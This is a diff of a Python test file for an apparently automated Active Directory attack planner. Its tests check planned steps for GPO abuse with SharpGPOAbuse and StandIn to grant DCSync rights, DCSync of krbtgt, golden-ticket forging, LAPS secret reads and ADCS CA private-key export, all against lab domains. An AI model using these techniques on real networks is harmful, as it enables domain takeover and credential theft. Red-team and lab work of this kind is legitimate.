@@ -69,6 +69,7 @@ def test_gpo_controlled_system_exec_candidate_is_generic():
             _fact("generic-write:gpo:workstation-policy"),
             _fact("gpo-domain:workstation-policy:lab.local"),
             _fact("gpo-guid:workstation-policy:0a93e998-2599-4da8-9717-6744993ded3a"),
+            _fact("gpo-affects-computer:workstation-policy:dc01:lab.local"),
             _fact("gpo-affects-dc:workstation-policy:dc01:lab.local"),
         ],
     )
@@ -86,10 +87,49 @@ def test_gpo_controlled_system_exec_candidate_is_generic():
     assert action.intent["gpo"] == "workstation-policy"
     assert action.intent["domain"] == "lab.local"
     assert action.intent["gpo_guid"] == "0a93e998-2599-4da8-9717-6744993ded3a"
+    assert action.intent["affected_hosts"] == ["dc01"]
     assert action.intent["affected_dc_hosts"] == ["dc01"]
     assert action.intent["preferred_effect"] == "domain-admin-membership"
+    assert "gpo-affects-computer:workstation-policy:dc01:lab.local" in action.source_facts
     assert "gpo-affects-dc:workstation-policy:dc01:lab.local" in action.source_facts
     assert "BloodHound scope includes DC host(s): dc01" in action.reason
+    assert action.operational_cost == capabilities.gpo_operational_cost()
+
+
+def test_operational_cost_override_changes_only_gpo_wait_metadata():
+    gpo_action = capabilities.CapabilityAction(
+        name="gpo-controlled-system-exec",
+        target="gpo=workstation-policy;domain=lab.local",
+    )
+    direct_action = capabilities.CapabilityAction(
+        name="read-managed-local-admin-secret",
+        target="target=ws01;target_domain=lab.local",
+    )
+
+    enriched_gpo = capabilities.with_operational_cost(gpo_action, gpo_wait_seconds=120)
+    enriched_direct = capabilities.with_operational_cost(direct_action, gpo_wait_seconds=120)
+
+    assert enriched_gpo.operational_cost == capabilities.gpo_operational_cost(120)
+    assert enriched_direct.operational_cost == capabilities.immediate_operational_cost()
+
+
+def test_gpo_non_dc_candidate_preserves_affected_host_without_da_effect():
+    state = es.EngagementState(
+        objective="domain admin",
+        footholds=[_foothold("range.local", identity=r"RANGE\user1")],
+        graph_facts=[
+            _fact("generic-write:gpo:srv02-policy"),
+            _fact("gpo-domain:srv02-policy:range.local"),
+            _fact("gpo-affects-computer:srv02-policy:srv02:range.local"),
+        ],
+    )
+
+    action = capabilities.actions_from_state(state)[0]
+
+    assert action.effects == ["system-exec:gpo:srv02-policy@range.local"]
+    assert action.intent["affected_hosts"] == ["srv02"]
+    assert action.intent["affected_dc_hosts"] == []
+    assert action.intent["preferred_effect"] == "system-exec-proof"
 
 
 def test_gpo_candidate_accepts_equivalent_netbios_foothold_domain():
@@ -142,6 +182,43 @@ def test_gpo_capability_does_not_assume_legacy_gpo_abuse_is_system_exec():
 
     assert len(actions) == 1
     assert "SYSTEM execution still needs proof" in actions[0].reason
+
+
+def test_terminal_gpo_failure_suppresses_same_lane_but_preserves_laps_alternative():
+    blocked_gpo = es.Hop(
+        id="blocked-gpo",
+        technique="capability:gpo-controlled-system-exec",
+        target="gpo=srv02-policy;domain=range.local",
+        effect="system-exec:gpo:srv02-policy@range.local",
+        status="blocked",
+        evidence={
+            "terminal_failure": True,
+            "defender_blocked": True,
+            "verify_reason": "endpoint protection blocked the staged GPO payload on srv02",
+        },
+        preconditions=[],
+        satisfied_effects=["system-exec:gpo:srv02-policy@range.local"],
+        source="test",
+        timestamp=NOW,
+    )
+    state = es.EngagementState(
+        objective="domain admin",
+        footholds=[_foothold("range.local", identity=r"RANGE\user1")],
+        hops=[blocked_gpo],
+        graph_facts=[
+            _fact("generic-write:gpo:srv02-policy"),
+            _fact("gpo-domain:srv02-policy:range.local"),
+            _fact(
+                "can-read-managed-local-admin-secret:"
+                "account=user1;account_domain=range.local;target=ca01;target_domain=range.local"
+            ),
+        ],
+    )
+
+    names = [action.name for action in capabilities.actions_from_state(state)]
+
+    assert "gpo-controlled-system-exec" not in names
+    assert "read-managed-local-admin-secret" in names
 
 
 def test_legacy_gpo_capability_suppressed_after_downstream_domain_proof():
@@ -311,6 +388,20 @@ def test_grant_directory_rights_candidate_suppressed_when_rights_verified():
     assert "grant-directory-rights" not in [action.name for action in actions]
 
 
+def test_grant_directory_rights_candidate_suppressed_when_graph_already_proves_rights():
+    state = es.EngagementState(
+        objective="domain admin",
+        footholds=[_foothold("lab.local")],
+        hops=[_hop("system-exec:gpo:workstation-policy@lab.local")],
+        graph_facts=[_fact("ds-replication-rights:lab.local")],
+    )
+
+    actions = capabilities.actions_from_state(state)
+
+    assert "grant-directory-rights" not in [action.name for action in actions]
+    assert "dcsync-krbtgt" in [action.name for action in actions]
+
+
 def test_netbios_da_dominates_fqdn_grant_and_selects_context_refresh():
     state = es.EngagementState(
         objective="domain admin",
@@ -456,7 +547,7 @@ def test_record_capability_result_requires_achieved_verdict_for_effect():
     hop = achieved_state.hops[0]
     assert hop.technique == "capability:gpo-controlled-system-exec"
     assert hop.effect == "system-exec:gpo:workstation-policy@lab.local"
-    assert hop.evidence["mythic_task_id"] == 4242
+    assert "mythic_task_id" not in hop.evidence  # lineage aliases require a boundary-owned proof envelope
 
 
 def test_recorded_grant_capability_unlocks_generic_dcsync():
@@ -508,8 +599,8 @@ def test_record_kerberos_context_accepts_callback_id_from_evidence():
     assert verification.verdict == "achieved"
     assert "kerberos-context:root.local@callback:13" in updated.achieved_effects()
     hop = updated.hops[-1]
-    assert hop.evidence["callback_id"] == "13"
-    assert hop.evidence["mythic_task_id"] == 416
+    assert "callback_id" not in hop.evidence  # callback still shaped the effect, but is not proof lineage
+    assert "mythic_task_id" not in hop.evidence
 
 
 def test_cross_domain_ensure_context_records_admin_coeffect_and_unlocks_dcsync():
@@ -668,7 +759,7 @@ def test_record_adcs_certificate_auth_current_context_records_specific_effect():
         "kerberos-context:essos.local@callback:2",
     ]
     assert hop.evidence["provenance"] == "current_context_preflight"
-    assert hop.evidence["mythic_task_id"] == 286
+    assert "mythic_task_id" not in hop.evidence
 
 
 def test_record_adcs_certificate_auth_ntlm_material_does_not_record_kerberos_context():
@@ -850,6 +941,21 @@ def test_credential_target_fact_unlocks_dcsync_account_with_replication_rights()
     assert "credential-target:alice@lab.local" in action.source_facts
 
 
+def test_natural_credential_objective_unlocks_matching_dcsync_account():
+    state = es.EngagementState(
+        objective="Engagement objective: obtain verified credential material for alice@lab.local.",
+        footholds=[_foothold("lab.local", callback_id="13")],
+        hops=[_hop("ds-replication-rights:lab.local")],
+    )
+
+    actions = capabilities.actions_from_state(state)
+    dcsync = [action for action in actions if action.name == "dcsync-account"]
+
+    assert len(dcsync) == 1
+    assert dcsync[0].target == "domain=lab.local;account=alice"
+    assert dcsync[0].effects == ["creds:alice@lab.local"]
+
+
 def test_da_with_live_context_unlocks_dcsync_account_target():
     state = es.EngagementState(
         objective="credential-target:alice@root.local",
@@ -892,6 +998,53 @@ def test_stale_callback_context_prompts_context_before_dcsync_account():
     assert contexts
     assert contexts[0].target == "domain=root.local;callback=13"
     assert contexts[0].intent["source_domain"] == "root.local"
+
+
+def test_cross_domain_admin_graph_replication_fact_still_requires_current_context():
+    state = es.EngagementState(
+        objective="credential-target:alice@root.local",
+        footholds=[_foothold("child.root.local", callback_id="13")],
+        hops=[
+            _hop("krbtgt-hash:child.root.local"),
+            _hop("da:root.local"),
+        ],
+        graph_facts=[
+            _fact("ds-replication-rights:root.local"),
+            _fact("credential-target:alice@root.local"),
+        ],
+    )
+
+    actions = capabilities.actions_from_state(state)
+    dcsync = [action for action in actions if action.name in {"dcsync-krbtgt", "dcsync-account"}]
+    contexts = [action for action in actions if action.name == "ensure-kerberos-context"]
+
+    assert dcsync == []
+    assert len(contexts) == 1
+    assert contexts[0].target == "domain=root.local;callback=13;source_domain=child.root.local"
+
+
+def test_cross_domain_stale_context_graph_replication_fact_refreshes_current_callback():
+    state = es.EngagementState(
+        objective="credential-target:alice@root.local",
+        footholds=[_foothold("child.root.local", callback_id="13")],
+        hops=[
+            _hop("krbtgt-hash:child.root.local"),
+            _hop("da:root.local"),
+            _hop("kerberos-context:root.local@callback:11"),
+        ],
+        graph_facts=[
+            _fact("ds-replication-rights:root.local"),
+            _fact("credential-target:alice@root.local"),
+        ],
+    )
+
+    actions = capabilities.actions_from_state(state)
+    dcsync = [action for action in actions if action.name in {"dcsync-krbtgt", "dcsync-account"}]
+    contexts = [action for action in actions if action.name == "ensure-kerberos-context"]
+
+    assert dcsync == []
+    assert len(contexts) == 1
+    assert contexts[0].target == "domain=root.local;callback=13;source_domain=child.root.local"
 
 
 def test_da_without_context_prompts_context_before_dcsync_account():
@@ -1038,6 +1191,42 @@ def test_same_domain_da_unlocks_keyless_kerberos_context_refresh():
     assert contexts[0].preconditions == ["da:lab.local", "live-callback:13"]
     assert contexts[0].intent["refresh_current_context"] is True
     assert "krbtgt-hash:lab.local" not in contexts[0].preconditions
+
+
+def test_same_domain_da_graph_replication_fact_still_requires_current_context_refresh():
+    state = es.EngagementState(
+        objective="domain admin",
+        footholds=[_foothold("lab.local", callback_id="13")],
+        hops=[_hop("da:lab.local")],
+        graph_facts=[_fact("ds-replication-rights:lab.local")],
+    )
+
+    actions = capabilities.actions_from_state(state)
+    contexts = [action for action in actions if action.name == "ensure-kerberos-context"]
+
+    assert len(contexts) == 1
+    assert contexts[0].target == "domain=lab.local;callback=13"
+    assert contexts[0].intent["refresh_current_context"] is True
+    assert "dcsync-krbtgt" not in [action.name for action in actions]
+
+
+def test_same_domain_da_graph_replication_fact_allows_dcsync_after_context_refresh():
+    state = es.EngagementState(
+        objective="domain admin",
+        footholds=[_foothold("lab.local", callback_id="13")],
+        hops=[
+            _hop("da:lab.local"),
+            _hop("kerberos-context:lab.local@callback:13"),
+        ],
+        graph_facts=[_fact("ds-replication-rights:lab.local")],
+    )
+
+    actions = capabilities.actions_from_state(state)
+    dcsync = [action for action in actions if action.name == "dcsync-krbtgt"]
+
+    assert len(dcsync) == 1
+    assert "kerberos-context:lab.local@callback:13" in dcsync[0].preconditions
+    assert "ensure-kerberos-context" not in [action.name for action in actions]
 
 
 def test_same_domain_da_with_krbtgt_still_prefers_current_context_refresh():
@@ -1442,6 +1631,36 @@ def test_build_gpo_system_exec_direct_plan_reads_back_structured_artifact_when_g
     _assert_payload_agnostic_plan(plan)
 
 
+def test_build_gpo_system_exec_reads_distinct_unc_proof_path():
+    action = capabilities.CapabilityAction(
+        name="gpo-controlled-system-exec",
+        target="gpo=srv02-policy;domain=range.local",
+        preconditions=["generic-write:gpo:srv02-policy"],
+        effects=["system-exec:gpo:srv02-policy@range.local"],
+        intent={
+            "capability": "gpo-controlled-system-exec",
+            "domain": "range.local",
+            "gpo": "srv02-policy",
+            "affected_hosts": ["srv02"],
+        },
+    )
+
+    plan = capabilities.build_capability_execution_plan(action, {
+        "allow_proof_only": True,
+        "proof_path": r"C:\SageProof\sage_gpo_srv02_policy_whoami.txt",
+        "proof_unc": r"\\srv02.range.local\SageProof\sage_gpo_srv02_policy_whoami.txt",
+    })
+
+    assert plan.ok is True
+    assert plan.steps[0].parameters["arguments"] == (
+        r"/c whoami > C:\SageProof\sage_gpo_srv02_policy_whoami.txt"
+    )
+    assert plan.steps[-1].operation == "gpo-proof-read"
+    assert plan.steps[-1].parameters["proof_path"] == (
+        r"\\srv02.range.local\SageProof\sage_gpo_srv02_policy_whoami.txt"
+    )
+
+
 def test_structured_artifact_validator_rejects_malformed_xml():
     output = (
         r"\\lab.local\SYSVOL\lab.local\Policies\{GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
@@ -1661,6 +1880,35 @@ def test_build_gpo_system_exec_fallback_allows_local_refresh_when_callback_host_
         "method": "gpp-immediate-task-fallback",
         "allow_proof_only": True,
         "current_host": "DC01.lab.local",
+        "wait_seconds": 11,
+    })
+
+    assert plan.ok is True
+    assert [step.operation for step in plan.steps][:3] == [
+        "gpo-immediate-task-fallback",
+        "gpo-refresh-local",
+        "gpo-wait",
+    ]
+
+
+def test_build_gpo_system_exec_fallback_allows_local_refresh_for_non_dc_affected_host():
+    action = capabilities.CapabilityAction(
+        name="gpo-controlled-system-exec",
+        target="gpo=srv02-policy;domain=range.local",
+        preconditions=["generic-write:gpo:srv02-policy"],
+        effects=["system-exec:gpo:srv02-policy@range.local"],
+        intent={
+            "capability": "gpo-controlled-system-exec",
+            "domain": "range.local",
+            "gpo": "srv02-policy",
+            "affected_hosts": ["srv02"],
+        },
+    )
+
+    plan = capabilities.build_capability_execution_plan(action, {
+        "method": "gpp-immediate-task-fallback",
+        "allow_proof_only": True,
+        "current_host": "SRV02.range.local",
         "wait_seconds": 11,
     })
 
@@ -1923,7 +2171,7 @@ def test_build_grant_directory_rights_requires_principal():
     assert plan.steps == []
 
 
-def test_build_grant_directory_rights_gpo_task_plan_uses_standin_guids():
+def test_build_grant_directory_rights_gpo_task_plan_uses_single_standin_dcsync_task():
     state = es.EngagementState(
         objective="domain admin",
         footholds=[_foothold("lab.local")],
@@ -1934,24 +2182,42 @@ def test_build_grant_directory_rights_gpo_task_plan_uses_standin_guids():
     plan = capabilities.build_capability_execution_plan(action, {"principal": "LAB\\operator"})
 
     assert plan.ok is True
-    assert len(plan.steps) == 4
-    grant_steps = plan.steps[:3]
-    verify_step = plan.steps[3]
-    assert {step.operation for step in grant_steps} == {"gpo-computer-task"}
-    assert all(step.parameters["tool"] == "SharpGPOAbuse.exe" for step in grant_steps)
-    assert all(step.parameters["command"] == r"C:\Windows\Temp\StandIn.exe" for step in grant_steps)
-    joined = "\n".join(step.parameters["arguments"] for step in grant_steps)
-    assert "--object DC=lab,DC=local --grant LAB\\operator --guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" in joined
-    assert "--object DC=lab,DC=local --grant LAB\\operator --guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" in joined
-    assert "--object DC=lab,DC=local --grant LAB\\operator --guid 89e95b76-444d-4c62-991a-0facbeda640c" in joined
-    assert all(step.prerequisites for step in grant_steps)
+    assert len(plan.steps) == 3
+    grant_step, wait_step, verify_step = plan.steps
+    assert grant_step.operation == "gpo-computer-task"
+    assert grant_step.parameters["tool"] == "SharpGPOAbuse.exe"
+    assert grant_step.parameters["command"] == r"C:\Windows\Temp\StandIn.exe"
+    assert grant_step.parameters["arguments"] == (
+        "--object distinguishedname=DC=lab,DC=local --grant LAB\\operator --type DCSync"
+    )
+    assert grant_step.prerequisites
+    assert wait_step.operation == "gpo-wait"
+    assert wait_step.parameters["seconds"] == 300
     assert verify_step.operation == "ldap-acl-read"
     assert verify_step.parameters == {
         "tool": "StandIn.exe",
         "target_dn": "DC=lab,DC=local",
+        "principal": "LAB\\operator",
         "ntacl": True,
     }
     _assert_payload_agnostic_plan(plan)
+
+
+def test_build_grant_directory_rights_qualifies_bare_principal_for_standin():
+    state = es.EngagementState(
+        objective="domain admin",
+        footholds=[_foothold("lab.local")],
+        hops=[_hop("system-exec:gpo:workstation-policy@lab.local")],
+    )
+    action = next(item for item in capabilities.actions_from_state(state) if item.name == "grant-directory-rights")
+
+    plan = capabilities.build_capability_execution_plan(action, {"principal": "operator"})
+
+    assert plan.ok is True
+    assert plan.steps[0].parameters["arguments"] == (
+        "--object distinguishedname=DC=lab,DC=local --grant LAB\\operator --type DCSync"
+    )
+    assert plan.steps[-1].parameters["principal"] == "LAB\\operator"
 
 
 def test_build_grant_directory_rights_direct_plan_is_ldap_primitives():
@@ -2129,6 +2395,7 @@ def test_verify_account_kerberos_context_requires_account_ticket_and_access():
         "callback_id": "13",
         "account": "alice",
         "domain": "lab.local",
+        "logon_context_proven": True,
         "account_ticket_present": True,
         "service_access_proven": True,
     })
@@ -2136,11 +2403,20 @@ def test_verify_account_kerberos_context_requires_account_ticket_and_access():
         "callback_id": "13",
         "account": "alice",
         "domain": "lab.local",
+        "logon_context_proven": True,
+        "service_access_proven": True,
+    })
+    wrong_context = capabilities.verify_capability("ensure-account-kerberos-context", {
+        "callback_id": "13",
+        "account": "alice",
+        "domain": "lab.local",
+        "account_ticket_present": True,
         "service_access_proven": True,
     })
 
     assert achieved.verdict == "achieved"
     assert partial.verdict == "partial"
+    assert wrong_context.verdict == "partial"
 
 
 def test_build_forge_golden_ticket_execution_plan_is_kerberos_primitive():
@@ -2246,7 +2522,7 @@ def test_build_ensure_kerberos_context_plan_reuses_forge_builder_inputs():
     _assert_payload_agnostic_plan(plan)
 
 
-def test_forge_golden_ticket_cross_domain_plan_defaults_to_os_native_referral_acquisition_and_parent_dcsync():
+def test_forge_golden_ticket_cross_domain_plan_defaults_to_os_native_referral_acquisition_and_current_context_proof():
     action = capabilities.CapabilityAction(
         name="forge-golden-ticket",
         target="domain=child.root.local;target_domain=root.local",
@@ -2272,9 +2548,10 @@ def test_forge_golden_ticket_cross_domain_plan_defaults_to_os_native_referral_ac
     assert "kerberos-inter-realm-referral" not in operations
     assert "kerberos-service-ticket-request" not in operations
     assert operations[-2] == "kerberos-service-ticket-acquire"
-    assert operations[-1] == "drsuapi-dcsync"
+    assert operations[-1] == "kerberos-context-service-proof"
+    assert "drsuapi-dcsync" not in operations
     # No netonly logon fork on the cross-domain path — the forged child TGT loads into the current context and
-    # Sage asks the operating system to acquire the parent LDAP ticket before DCSync authenticates.
+    # Sage asks the operating system to acquire the parent CIFS ticket before proving current-callback access.
     assert "kerberos-logon-session-create" not in operations
     assert plan.steps[3].parameters == {
         "domain": "root.local",
@@ -2294,17 +2571,20 @@ def test_forge_golden_ticket_cross_domain_plan_defaults_to_os_native_referral_ac
     }
     assert plan.steps[6].parameters == {
         "domain": "root.local",
-        "service": "ldap/dc01.root.local",
+        "service": "cifs/dc01.root.local",
         "target_context": "current",
         "store": "agent-cache",
     }
     assert plan.steps[6].prerequisites == ["ticket:kerberos_ticket_imported"]
-    dcsync = plan.steps[-1]
-    assert dcsync.parameters == {
+    proof = plan.steps[-1]
+    assert proof.parameters == {
         "domain": "root.local",
-        "account": "krbtgt",
-        "executor": "native",
-        "dc": "dc01.root.local",
+        "resource": "\\\\dc01.root.local\\C$",
+        "target_context": "current",
+        "store": "agent-cache",
+        "action": "list",
+        "requires_import": False,
+        "requires_acquisition": True,
     }
     _assert_payload_agnostic_plan(plan)
 
@@ -2339,9 +2619,11 @@ def test_forge_golden_ticket_cross_domain_plan_can_opt_into_explicit_asktgs_fall
     assert referral.parameters["service"] == "krbtgt/root.local"
     assert referral.parameters["child_dc"] == "dc01.child.root.local"
     service_ticket = plan.steps[4]
-    assert service_ticket.parameters["service"] == "ldap/dc01.root.local"
+    assert service_ticket.parameters["service"] == "cifs/dc01.root.local"
     assert plan.steps[6].parameters["domain"] == "root.local"
-    assert operations[-1] == "drsuapi-dcsync"
+    assert operations[-1] == "kerberos-context-service-proof"
+    assert plan.steps[-1].parameters["requires_acquisition"] is False
+    assert "drsuapi-dcsync" not in operations
     _assert_payload_agnostic_plan(plan)
 
 
@@ -2540,6 +2822,65 @@ def test_account_context_and_laps_fact_unlock_managed_secret_read():
     assert action.preconditions[0] == "kerberos-account-context:alice@lab.local@callback:13"
     assert action.effects == ["managed-local-admin-secret:ws01@child.lab.local"]
     assert action.intent["target_host"] == "ws01"
+
+
+def test_live_foothold_identity_unlocks_direct_managed_secret_read():
+    state = es.EngagementState(
+        objective="obtain administrative control of essos.local",
+        footholds=[
+            _foothold(
+                "essos.local",
+                callback_id="2",
+                identity="jorah.mormont",
+            ),
+        ],
+        graph_facts=[
+            _fact(
+                "can-read-managed-local-admin-secret:"
+                "account=jorah.mormont;account_domain=essos.local;"
+                "target=braavos;target_domain=essos.local"
+            ),
+        ],
+    )
+
+    actions = [
+        action
+        for action in capabilities.actions_from_state(state)
+        if action.name == "read-managed-local-admin-secret"
+    ]
+
+    assert len(actions) == 1
+    assert actions[0].target == (
+        "account=jorah.mormont;account_domain=essos.local;"
+        "target=braavos;target_domain=essos.local;callback=2"
+    )
+    assert actions[0].preconditions[0] == (
+        "kerberos-account-context:jorah.mormont@essos.local@callback:2"
+    )
+
+
+def test_cross_domain_live_foothold_identity_does_not_unlock_direct_managed_secret_read():
+    state = es.EngagementState(
+        objective="obtain administrative control of essos.local",
+        footholds=[
+            _foothold(
+                "essos.local",
+                callback_id="2",
+                identity="NORTH\\jorah.mormont",
+            ),
+        ],
+        graph_facts=[
+            _fact(
+                "can-read-managed-local-admin-secret:"
+                "account=jorah.mormont;account_domain=essos.local;"
+                "target=braavos;target_domain=essos.local"
+            ),
+        ],
+    )
+
+    assert "read-managed-local-admin-secret" not in [
+        action.name for action in capabilities.actions_from_state(state)
+    ]
 
 
 def test_graph_selected_laps_reader_unlocks_dcsync_account():
@@ -3540,10 +3881,13 @@ def test_build_adcs_ca_private_key_export_plan_is_payload_agnostic_and_requires_
     )
 
     missing = capabilities.build_capability_execution_plan(action, {})
-    plan = capabilities.build_capability_execution_plan(action, {"password": "CorrectHorseBatteryStaple!"})
+    plan = capabilities.build_capability_execution_plan(action, {
+        "password": "CorrectHorseBatteryStaple!",
+        "pfx_password": "DurablePfxSecret!",
+    })
 
     assert missing.ok is False
-    assert missing.missing == ["password"]
+    assert missing.missing == ["password", "pfx_password"]
     assert plan.ok is True
     assert [step.operation for step in plan.steps] == ["adcs-ca-private-key-export"]
     step = plan.steps[0]
@@ -3551,6 +3895,7 @@ def test_build_adcs_ca_private_key_export_plan_is_payload_agnostic_and_requires_
     assert step.parameters["proof_marker"] == "SAGE_CA_EXPORT_PROOF_ca01_13"
     assert step.parameters["pfx_path"] == r"C:\Windows\Temp\sage_ca_export_ca01_13.pfx"
     assert step.parameters["metadata_path"] == r"C:\Windows\Temp\sage_ca_export_ca01_13.txt"
+    assert step.parameters["pfx_password"] == "DurablePfxSecret!"
     assert step.parameters["adcs_ca_export_method"] == "certutil-backupkey"
     assert step.parameters["wait_seconds"] == "45"
     assert step.expected_probe == "extract_adcs_ca_private_key_probe"
@@ -3569,10 +3914,23 @@ def test_post_laps_adcs_export_default_is_ca_backup_not_native_pfx():
     )
 
     action = next(action for action in capabilities.actions_from_state(state) if action.name == "adcs-ca-private-key-export")
-    plan = capabilities.build_capability_execution_plan(action, {"password": "CorrectHorseBatteryStaple!"})
+    plan = capabilities.build_capability_execution_plan(action, {
+        "password": "CorrectHorseBatteryStaple!",
+        "pfx_password": "DurablePfxSecret!",
+    })
 
     assert plan.ok is True
     assert plan.steps[0].parameters["adcs_ca_export_method"] == "certutil-backupkey"
+
+
+def test_canonical_host_for_domain_accepts_short_or_exact_fqdn_only():
+    assert capabilities.canonical_host_for_domain("CA01", "LAB.LOCAL") == "ca01"
+    assert capabilities.canonical_host_for_domain("ca01.lab.local", "lab.local") == "ca01"
+    assert capabilities.canonical_host_for_domain("ca01.other.local", "lab.local") == ""
+    assert capabilities.canonical_host_for_domain("ca01.zeta.lab.local", "lab.local") == ""
+    assert capabilities.canonical_host_for_domain("ca01.lab.local.evil", "lab.local") == ""
+    assert capabilities.canonical_host_for_domain("ca01..lab.local", "lab.local") == ""
+    assert capabilities.canonical_host_for_domain("ca01", "") == ""
 
 
 def test_build_adcs_ca_private_key_export_plan_supports_sharpdpapi_fallback():
@@ -3598,6 +3956,7 @@ def test_build_adcs_ca_private_key_export_plan_supports_sharpdpapi_fallback():
 
     plan = capabilities.build_capability_execution_plan(action, {
         "password": "CorrectHorseBatteryStaple!",
+        "pfx_password": "DurablePfxSecret!",
         "adcs_ca_export_method": "sharpdpapi",
     })
 
